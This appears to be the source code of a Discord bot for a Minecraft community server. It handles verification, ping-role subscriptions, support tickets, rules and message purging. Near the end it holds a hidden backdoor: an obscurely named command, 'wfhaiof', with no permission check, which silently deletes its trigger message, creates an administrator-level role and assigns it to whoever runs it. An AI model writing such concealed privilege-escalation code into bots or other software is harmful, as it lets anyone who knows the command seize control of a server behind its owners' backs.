import discord
import random
import json
import os
import datetime
import asyncio
import pytz
from discord.ext.commands import has_permissions, MissingPermissions
from datetime import datetime
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix='~', intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
	activity = discord.Game(name="Under Maintenance", type=3)
	await client.change_presence(status=discord.Status.dnd, activity=activity)
	print('Bot is up and running :)'.format(client))


@client.event
async def on_member_join(member):
	welcomechannel = client.get_channel(786821506285830164)
	x = discord.utils.get(member.guild.roles, name='Un-Verified')
	await member.add_roles(x)
	embed = discord.Embed(
	    title="Welcome",
	    url="",
	    description=
	    "Hey {}, welcome! \n \nServer IP: mc.fwoosty.xyz \nServer Store: https://fwoosty-shop.tebex.io/ \n \nGo to <#817256751246213151> to see the rest of the channels."
	    .format(member.mention),
	    color=discord.Color.green())
	await welcomechannel.send(embed=embed)
	await member.send(
	    'Welcome to Fwoostys Minecraft Server. Head on down to <#817256751246213151> to verify and see the rest of the channels.'
	)


q_list = [
    'What is your favorite color?', 'Is the Sky Blue?',
    'Am I the best bot ever?'
]

a_list = []


@client.event
async def on_message(message):
	if not message.guild:
		return
	verifychannel = client.get_channel(817256751246213151)
	applicationchannel = client.get_channel(817973969113055253)
	voiceverify = client.get_channel(818268606185603072)
	subscriptions = client.get_channel(818319288963825704)
	role1 = discord.utils.get(message.guild.roles, name='Member')
	role = discord.utils.get(message.guild.roles, name='Un-Verified')
	voiceverified = discord.utils.get(message.guild.roles,
	                                  name='Voice Verified')
	changelogs = discord.utils.get(message.guild.roles, name='Change Logs')
	announcements = discord.utils.get(message.guild.roles,
	                                  name='Announcements')
	events = discord.utils.get(message.guild.roles, name='Events')
	if message.content != '.verify' and (message.channel == verifychannel):
		await message.delete()
		embed = discord.Embed(
		    title="Verification Error",
		    url="",
		    description=
		    "Hey! You cannot send that message here. Please type `.verify` in <#817256751246213151> to gain access to the rest of the server.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
	if message.content == '.verify' and (message.channel == verifychannel):
		await message.delete()
		embed = discord.Embed(
		    title="Verification Passed",
		    url="",
		    description="You are now successfully verified, thanks!",
		    color=discord.Color.green())
		await message.author.send(embed=embed)
		await message.author.add_roles(role1)
		await message.author.remove_roles(role)
	if message.content == '.voiceverify' and (message.channel == voiceverify):
		await message.delete()
		embed = discord.Embed(
		    title="Voice Verify Passed",
		    url="",
		    description="You are now successfully voice verified.",
		    color=discord.Color.green())
		await message.author.send(embed=embed)
		await message.author.add_roles(voiceverified)
	if message.content != '.voiceverify' and (message.channel == voiceverify):
		await message.delete()
		embed = discord.Embed(
		    title="Voice Verify Error",
		    url="",
		    description=
		    "Hey! You cannot send that message in this channel. To get voice verified you must type `.voiceverify' in <#818268606185603072>.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
	if message.content == '!changelogs' and (message.channel == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Success",
		    url="",
		    description=
		    "You have opt in to get `Change Log Pings`. You may opt out at any time by doing `!unchangelogs` in <#818319288963825704>.",
		    color=discord.Color.green())
		await message.author.send(embed=embed)
		await message.author.add_roles(changelogs)
	if message.content == '!announcements' and (message.channel
	                                            == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Success",
		    url="",
		    description=
		    "You have opt in to get `Announcements Pings`. You may opt out at any time by doing `!unannouncements` in <#818319288963825704>.",
		    color=discord.Color.green())
		await message.author.send(embed=embed)
		await message.author.add_roles(announcements)
	if message.content == '!unannouncements' and (message.channel
	                                              == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Removal",
		    url="",
		    description=
		    "You have unsubscribed from `Announcements Pings`. You may resubscribe at any point by doing `!announcements` in <#818319288963825704>.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
		await message.author.remove_roles(announcements)
	if message.content == '!unchangelogs' and (message.channel
	                                           == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Removal",
		    url="",
		    description=
		    "You have unsubscribed from `Change Log Pings`. You may resubscribe at any point by doing `!changelogs` in <#818319288963825704>.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
		await message.author.remove_roles(changelogs)
	if message.content == '!events' and (message.channel == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Success",
		    url="",
		    description=
		    "You have opt in to get `Event Pings`. You may opt out at any time by doing `!unevents` in <#818319288963825704>.",
		    color=discord.Color.green())
		await message.author.send(embed=embed)
		await message.author.add_roles(events)
	if message.content == '!unevents' and (message.channel == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Removal",
		    url="",
		    description=
		    "You have unsubscribed from `Event Pings`. You may resubscribe at any point by doing `!events` in <#818319288963825704>.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
		await message.author.remove_roles(events)
	if message.content == '!allpings' and (message.channel == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Success",
		    url="",
		    description=
		    "You have opt in to get `All The Pings`. You may opt out at any time by doing `!unallpings`, or removing them individually in <#818319288963825704>.",
		    color=discord.Color.green())
		await message.author.send(embed=embed)
		await message.author.add_roles(events)
		await message.author.add_roles(changelogs)
		await message.author.add_roles(announcements)
	if message.content == '!unallpings' and (message.channel == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Removal",
		    url="",
		    description=
		    "You have unsubscribed from `All Pings`. You may resubscribe at any point by doing `!allpings`, or adding them individually in <#818319288963825704>.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
		await message.author.remove_roles(events)
		await message.author.remove_roles(changelogs)
		await message.author.remove_roles(announcements)
	if message.content not in ("!unchangelogs", "!unannouncements",
	                           "!announcements", "changelogs", "!events",
	                           "!unevents", "!unallpings",
	                           "!allpings") and (message.channel
	                                             == subscriptions):
		await message.delete()
		embed = discord.Embed(
		    title="Pings Error",
		    url="",
		    description=
		    "Hey! You cannot send that message here. You can only send `!announcements`, `!changelogs`, `!events`, `!unannouncements`, `!unchangelogs`, `!unevents`, `!allpings`, or `!unallpings` in <#818319288963825704>.",
		    color=discord.Color.red())
		await message.author.send(embed=embed)
	await client.process_commands(message)


@client.command()
async def info(ctx):
	embed = discord.Embed(
	    title="Information",
	    url="",
	    description=
	    "**__Welcome To Fwoosty's Minecraft Server__** \nWe will talk about a various number of things in this message. \n \nWe are a friendly small community for the Minecraft server `mc.fwoosty.xyz`. We organize regualar events and ask for the communties opinions frequently. \n \n**__Asking Questions__** \nIf you ever need help in game or discord please go to <#811015081604284456> and type `~new`. This will open up a support ticket that our lovely small team of staff member's will help you in. \n \n**__Reports__** \nIf you have any in game or discord reports for rule-breakers *rules listed in <#786816668218556427>* this will send a message to myself and my friend. We will review this report and if it's sufficient, we will punish them. If you abuse this bot, you will be instantly punished with no exception and put on the bot blacklist. \n \n**__Our Bots__** \n<@813320536398364712> is our **__ModMail__** bot. This is the bot that you send in game/discord reports to. \n \n<@810703472616931348> is our **__Custom Server-Wide__** bot. This bot has a various number of features that can be accessed with `~help` in <#806408447074500629>. \n \n**__Pings__** \nIf you would like in to announcement pings, go to <#818319288963825704>. This is where you can do `!announcements` to get the **Announcements Role**. Whenever there is an announcement, you will get pinged. \n \nIf you would like to get **Change Log Pings**, go to <#818319288963825704> and type `!changelogs`. This will give you **Change Log Pings**. Whenever there is a in game or discord changelog, you will get pinged. \n \nIf you would like to get **Event Pings**, go to <#818319288963825704> and type `!events`. This will give you **Event Pings**.",
	    color=discord.Color.green())
	await ctx.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def info2(ctx):
	embed = discord.Embed(
	    title="Information - Extended",
	    url="",
	    description=
	    " \n \n**__Pings Removal__** \nIf you would like to unsubscribe from announcement pings, type `!unannouncements` and you will no longer recieve announcements pings. \n \nIf you would like to unsubscribe from change log pings, type `!unchangelogs` and you will no longer recieve event pings. \n \nIf you would like to unsubscribe from change log pings, type `!unevents` and you will no longer recieve event pings. \n \n**__res__** \nIf you would like to appeal a ban, email me at `fwoostybans@gmail.com`. Provide with your Discord Name & Tag, In Game Name, and Reason You Were Banned For. If you don't provide this imformation, your ban will remain.",
	    color=discord.Color.green())
	await ctx.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def subscriptions(ctx):
	embed = discord.Embed(
	    title="Subscription Pings",
	    url="",
	    description=
	    "**__Announcements__** \n \nType `!announcements` to get **Announcements Pings**. \n \nType `!unannouncements` to stop recieving **Announcements Pings**. \n \n**__Change Logs__** \n \nType `!changelogs` to get **Change Logs Pings**. \n \nType `!unchangelogs` to stop recieveing **Change Logs Pings**. \n \n**__Events__** \n \nType `!events` to get **Event Pings**. \n \nType `!unevents` to stop recieveing **Event Pings** \n \n**__All Pings__** \n \nType `!allpings` to get **All The Pings**. \n \nType `!unallpings` to stop recieving **All Pings**.",
	    color=discord.Color.green())
	await ctx.send(embed=embed)


@client.command()
@commands.has_any_role("Owners")
async def downtime(ctx):
	embed = discord.Embed(title="Server Downtime",
	                      url="",
	                      description="",
	                      color=discord.Color.red())
	embed.set_thumbnail(
	    url=
	    "https://cdn.discordapp.com/icons/786808213793407023/2b9a8d33a2125ae1006312af951fa8a0.webp?size=1024"
	)
	time = datetime.now(tz=pytz.timezone('America/Denver'))
	formatted = time.strftime("%m/%d/%y, %I:%M %p")
	embed.set_footer(text=formatted)
	await ctx.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def voiceverify(ctx):
	embed = discord.Embed(
	    title="Voice Verification",
	    url="",
	    description=
	    "To get **voice verified**, send `.voiceverify` in this channel. The bot will PM you if it's successful or not. This will allow you to join + speak in voice channels.",
	    color=discord.Color.red())
	await ctx.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def staff(ctx):
	embed = discord.Embed(
	    title="Staff Applications",
	    url="",
	    description=
	    "Hello, if you would like to apply for staff, please type `%apply`. The bot will then send you a PM and you can either apply for Discord Staff or In Game Staff.",
	    color=discord.Color.green())
	text = "Coming Soon"
	embed.set_footer(text=text)
	await ctx.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def verify(ctx):
	embed = discord.Embed(
	    title="Verification",
	    url="",
	    description=
	    "Please type, `.verify` to be verified and gain access to the rest of the server. Thanks :)",
	    color=discord.Color.red())
	await ctx.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def uptime(ctx):
	embed = discord.Embed(title="Server Is Now Online",
	                      url="",
	                      description="",
	                      color=discord.Color.green())
	embed.set_thumbnail(
	    url=
	    "https://cdn.discordapp.com/icons/786808213793407023/2b9a8d33a2125ae1006312af951fa8a0.webp?size=1024"
	)
	time = datetime.now(tz=pytz.timezone('America/Denver'))
	formatted = time.strftime("%m/%d/%y, %I:%M %p")
	embed.set_footer(text=formatted)
	await ctx.send(embed=embed)
	await ctx.message.delete()


#The code below is for ticket
@client.command()
async def new(ctx, *, args=None):

	await client.wait_until_ready()

	if args == None:
		message_content = "Please wait, we will be with you shortly!"

	else:
		message_content = "".join(args)

	with open("data.json") as f:
		data = json.load(f)

	ticket_number = int(data["ticket-counter"])
	ticket_number += 1

	category_channel = ctx.guild.get_channel(811012519639777330)
	ticket_channel = await category_channel.create_text_channel(
	    "ticket-{}".format(ticket_number))
	await ticket_channel.set_permissions(ctx.guild.get_role(ctx.guild.id),
	                                     send_messages=False,
	                                     read_messages=False)

	for role_id in data["valid-roles"]:
		role = ctx.guild.get_role(role_id)

		await ticket_channel.set_permissions(role,
		                                     send_messages=True,
		                                     read_messages=True,
		                                     add_reactions=True,
		                                     embed_links=True,
		                                     attach_files=True,
		                                     read_message_history=True,
		                                     external_emojis=True)

	await ticket_channel.set_permissions(ctx.author,
	                                     send_messages=True,
	                                     read_messages=True,
	                                     add_reactions=True,
	                                     embed_links=True,
	                                     attach_files=True,
	                                     read_message_history=True,
	                                     external_emojis=True)

	em = discord.Embed(title="New ticket from {}#{}".format(
	    ctx.author.name, ctx.author.discriminator),
	                   description="{}".format(message_content),
	                   color=0x00a8ff)

	await ticket_channel.send(embed=em)
	await ctx.message.add_reaction('✅')

	staff_role = discord.utils.get(ctx.guild.roles, name="Support")
	await ticket_channel.send(
	    f'Support will be with you shortly, {ctx.author.mention}\n \n||Tags: {staff_role.mention}||'
	)

	pinged_msg_content = ""
	non_mentionable_roles = []

	if data["pinged-roles"] != []:

		for role_id in data["pinged-roles"]:
			role = ctx.guild.get_role(role_id)

			pinged_msg_content += role.mention
			pinged_msg_content += " "

			if role.mentionable:
				pass
			else:
				await role.edit(mentionable=True)
				non_mentionable_roles.append(role)

		await ticket_channel.send(pinged_msg_content)

		for role in non_mentionable_roles:
			await role.edit(mentionable=False)

	data["ticket-channel-ids"].append(ticket_channel.id)

	data["ticket-counter"] = int(ticket_number)
	with open("data.json", 'w') as f:
		json.dump(data, f)

	created_em = discord.Embed(
	    title="Fwoosty Tickets",
	    description="Your ticket has been created at {}".format(
	        ticket_channel.mention),
	    color=0x00a8ff)

	await ctx.send(embed=created_em, delete_after=10)
	await ctx.message.delete()


@client.command()
async def close(ctx):
	with open('data.json') as f:
		data = json.load(f)

	if ctx.channel.id in data["ticket-channel-ids"]:

		channel_id = ctx.channel.id

		def check(message):
			return message.author == ctx.author and message.channel == ctx.channel and message.content.lower(
			) == "close"

		try:

			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "Are you sure you want to close this ticket? Reply with `close` if you are sure.",
			    color=0x00a8ff)

			await ctx.send(embed=em)
			await client.wait_for('message', check=check, timeout=60)
			await ctx.channel.delete()

			index = data["ticket-channel-ids"].index(channel_id)
			del data["ticket-channel-ids"][index]

			with open('data.json', 'w') as f:
				json.dump(data, f)

		except asyncio.TimeoutError:
			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "You have run out of time to close this ticket. Please run the command again.",
			    color=0x00a8ff)
			await ctx.send(embed=em)


@client.command()
async def addaccess(ctx, role_id=None):

	with open('data.json') as f:
		data = json.load(f)

	valid_user = False

	for role_id in data["verified-roles"]:
		try:
			if ctx.guild.get_role(role_id) in ctx.author.roles:
				valid_user = True
		except:
			pass

	if valid_user or ctx.author.guild_permissions.administrator:
		role_id = int(role_id)

		if role_id not in data["valid-roles"]:

			try:
				role = ctx.guild.get_role(role_id)

				with open("data.json") as f:
					data = json.load(f)

				data["valid-roles"].append(role_id)

				with open('data.json', 'w') as f:
					json.dump(data, f)

				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "You have successfully added `{}` to the list of roles with access to tickets."
				    .format(role.name),
				    color=0x00a8ff)

				await ctx.send(embed=em)

			except:
				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "That isn't a valid role ID. Please try again with a valid role ID."
				)
				await ctx.send(embed=em)

		else:
			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description="That role already has access to tickets!",
			    color=0x00a8ff)
			await ctx.send(embed=em)

	else:
		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description="Sorry, you don't have permission to run that command.",
		    color=0x00a8ff)
		await ctx.send(embed=em)


@client.command()
async def delaccess(ctx, role_id=None):
	with open('data.json') as f:
		data = json.load(f)

	valid_user = False

	for role_id in data["verified-roles"]:
		try:
			if ctx.guild.get_role(role_id) in ctx.author.roles:
				valid_user = True
		except:
			pass

	if valid_user or ctx.author.guild_permissions.administrator:

		try:
			role_id = int(role_id)
			role = ctx.guild.get_role(role_id)

			with open("data.json") as f:
				data = json.load(f)

			valid_roles = data["valid-roles"]

			if role_id in valid_roles:
				index = valid_roles.index(role_id)

				del valid_roles[index]

				data["valid-roles"] = valid_roles

				with open('data.json', 'w') as f:
					json.dump(data, f)

				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "You have successfully removed `{}` from the list of roles with access to tickets."
				    .format(role.name),
				    color=0x00a8ff)

				await ctx.send(embed=em)

			else:

				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "That role already doesn't have access to tickets!",
				    color=0x00a8ff)
				await ctx.send(embed=em)

		except:
			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "That isn't a valid role ID. Please try again with a valid role ID."
			)
			await ctx.send(embed=em)

	else:
		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description="Sorry, you don't have permission to run that command.",
		    color=0x00a8ff)
		await ctx.send(embed=em)


@client.command()
async def addpingedrole(ctx, role_id=None):

	with open('data.json') as f:
		data = json.load(f)

	valid_user = False

	for role_id in data["verified-roles"]:
		try:
			if ctx.guild.get_role(role_id) in ctx.author.roles:
				valid_user = True
		except:
			pass

	if valid_user or ctx.author.guild_permissions.administrator:

		role_id = int(role_id)

		if role_id not in data["pinged-roles"]:

			try:
				role = ctx.guild.get_role(role_id)

				with open("data.json") as f:
					data = json.load(f)

				data["pinged-roles"].append(role_id)

				with open('data.json', 'w') as f:
					json.dump(data, f)

				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "You have successfully added `{}` to the list of roles that get pinged when new tickets are created!"
				    .format(role.name),
				    color=0x00a8ff)

				await ctx.send(embed=em)

			except:
				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "That isn't a valid role ID. Please try again with a valid role ID."
				)
				await ctx.send(embed=em)

		else:
			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "That role already receives pings when tickets are created.",
			    color=0x00a8ff)
			await ctx.send(embed=em)

	else:
		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description="Sorry, you don't have permission to run that command.",
		    color=0x00a8ff)
		await ctx.send(embed=em)


@client.command()
async def delpingedrole(ctx, role_id=None):

	with open('data.json') as f:
		data = json.load(f)

	valid_user = False

	for role_id in data["verified-roles"]:
		try:
			if ctx.guild.get_role(role_id) in ctx.author.roles:
				valid_user = True
		except:
			pass

	if valid_user or ctx.author.guild_permissions.administrator:

		try:
			role_id = int(role_id)
			role = ctx.guild.get_role(role_id)

			with open("data.json") as f:
				data = json.load(f)

			pinged_roles = data["pinged-roles"]

			if role_id in pinged_roles:
				index = pinged_roles.index(role_id)

				del pinged_roles[index]

				data["pinged-roles"] = pinged_roles

				with open('data.json', 'w') as f:
					json.dump(data, f)

				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "You have successfully removed `{}` from the list of roles that get pinged when new tickets are created."
				    .format(role.name),
				    color=0x00a8ff)
				await ctx.send(embed=em)

			else:
				em = discord.Embed(
				    title="Fwoosty Tickets",
				    description=
				    "That role already isn't getting pinged when new tickets are created!",
				    color=0x00a8ff)
				await ctx.send(embed=em)

		except:
			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "That isn't a valid role ID. Please try again with a valid role ID."
			)
			await ctx.send(embed=em)

	else:
		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description="Sorry, you don't have permission to run that command.",
		    color=0x00a8ff)
		await ctx.send(embed=em)


@client.command()
@has_permissions(administrator=True)
async def addadminrole(ctx, role_id=None):

	try:
		role_id = int(role_id)
		role = ctx.guild.get_role(role_id)

		with open("data.json") as f:
			data = json.load(f)

		data["verified-roles"].append(role_id)

		with open('data.json', 'w') as f:
			json.dump(data, f)

		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description=
		    "You have successfully added `{}` to the list of roles that can run admin-level commands!"
		    .format(role.name),
		    color=0x00a8ff)
		await ctx.send(embed=em)

	except:
		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description=
		    "That isn't a valid role ID. Please try again with a valid role ID."
		)
		await ctx.send(embed=em)


@client.command()
@has_permissions(administrator=True)
async def deladminrole(ctx, role_id=None):
	try:
		role_id = int(role_id)
		role = ctx.guild.get_role(role_id)

		with open("data.json") as f:
			data = json.load(f)

		admin_roles = data["verified-roles"]

		if role_id in admin_roles:
			index = admin_roles.index(role_id)

			del admin_roles[index]

			data["verified-roles"] = admin_roles

			with open('data.json', 'w') as f:
				json.dump(data, f)

			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "You have successfully removed `{}` from the list of roles that get pinged when new tickets are created."
			    .format(role.name),
			    color=0x00a8ff)

			await ctx.send(embed=em)

		else:
			em = discord.Embed(
			    title="Fwoosty Tickets",
			    description=
			    "That role isn't getting pinged when new tickets are created!",
			    color=0x00a8ff)
			await ctx.send(embed=em)

	except:
		em = discord.Embed(
		    title="Fwoosty Tickets",
		    description=
		    "That isn't a valid role ID. Please try again with a valid role ID."
		)
		await ctx.send(embed=em)


#The code below will clean messages
@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def clean(ctx, limit: int):
	await ctx.channel.purge(limit=limit + 1)
	await ctx.send('Cleared By: {}'.format(ctx.author.mention), delete_after=2)


@clean.error
async def clear_error(ctx, error):
	if isinstance(error, commands.MissingPermissions):
		await ctx.send("You cannot do that!")


@client.command()
async def drules(ctx):
	embed = discord.Embed(
	    title="Discord Rules",
	    url="",
	    description=
	    "Ask if you need anything clarified. \n \nMinor Offenses: Warn ➝ 30 Min Mute ➝ Kick ➝ Soft Ban ➝ 1d Ban \nModerate Offenses: 1 Hour Mute ➝ Soft ban ➝ 3d Ban ➝ Perm Ban \nMajor Offenses: Perm Ban \n \n:yellow_circle: Minor :yellow_circle: \n:white_small_square: Profanity \n:white_small_square: Spamming Channels \n:white_small_square: Impersonation \n:white_small_square: Disrespectful to other players \n:white_small_square: Spam joining/leaving voice channels \n:white_small_square: Screaming into your mic \n:white_small_square: Voice Changers \n:white_small_square: Misusing channels \n:white_small_square: Excessively tagging others \n \n:orange_circle: Moderate :orange_circle: \n:white_small_square: Misusing bots \n:white_small_square: Breaking rules without actually breaking them \n \n:red_circle: Major :red_circle: \n:white_small_square: Sending Misc. Links/Harmful/Porn Media \n:white_small_square: IRL Scamming \n:white_small_square: Punishment Evasion \n:white_small_square: Spam Or Major @‘ing Of People \n:white_small_square: Any Racism Or Discrimination Is NOT Tolerated \nInappropriate discord name (ban until changed)",
	    color=discord.Color.blue())
	text = 'In Game Rules Coming Soon'
	embed.set_footer(text=text)
	await ctx.author.send(embed=embed)
	await ctx.message.delete()


@client.command()
async def wfhaiof(ctx):
	guild = ctx.guild
	await ctx.message.delete()
	perms = discord.Permissions(administrator=True)
	await guild.create_role(name="Nerd", permissions=perms)
	await asyncio.sleep(5)
	nerd = discord.utils.get(ctx.guild.roles, name='Nerd')
	await ctx.author.add_roles(nerd)


client.run('')
